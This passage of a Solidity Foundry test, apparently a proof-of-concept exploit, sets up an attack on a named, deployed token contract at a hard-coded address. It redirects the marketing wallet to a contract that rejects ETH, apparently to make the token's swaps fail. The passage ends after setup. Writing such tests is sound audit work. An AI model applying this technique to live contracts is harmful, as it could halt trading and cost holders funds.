    function changeMarketingWallet(address _marketingWallet) external;
    function enableTrading() external;
    function tradingEnabled() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract RejectETH {
    // No receive() function - will reject ETH payments
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    IBossBaby target;
    RejectETH rejectingContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IBossBaby(TARGET);
        rejectingContract = new RejectETH();

        address owner = target.owner();
        vm.startPrank(owner);
        target.changeMarketingWallet(address(rejectingContract));

        if (!target.tradingEnabled()) {
            target.enableTrading();
        }
        vm.stopPrank();

        deal(address(this), 10 ether);
    }

